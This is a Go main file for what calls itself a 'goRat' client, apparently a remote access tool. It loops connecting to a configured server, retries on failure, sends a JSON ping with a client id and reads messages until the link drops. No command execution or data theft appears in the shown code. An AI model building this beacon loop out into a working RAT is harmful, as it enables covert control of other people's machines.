package main

import (
	"fmt"
	"time"

	"github.com/viher3/gorat-client/config"
	"github.com/viher3/gorat-client/network/socket"
)

func main() {

	conf := config.NewConfig()
	fmt.Println("############################")
	fmt.Println("### goRat client v"+conf.Version, "###")
	fmt.Println("############################")

	for {
		conn, err := socket.ConnectToServer(conf)

		if err != nil {
			timeToWait := time.Duration(conf.WaitTimeUntilServerConnectionRetryInSeconds) * time.Second
			fmt.Printf("Retrying connection in %s ...\n", timeToWait)
			time.Sleep(timeToWait)
			continue
		}

		// dispatch ping message to server
		// TODO: move to server_command
		fmt.Println("Connected to server!")
		clientId := "someid" + time.Now().Format("20060102150405")
		socket.SendMessage(conn, "{\"action\": \"ping\", \"payload\": {\"client_id\": \""+clientId+"\"}}\n")

		for {
			_, err := socket.ReceiveMessage(conn)
			if err != nil {
				fmt.Println("Connection lost:", err)
				socket.CloseConnection(conn)
				break
			}
		}
	}

}
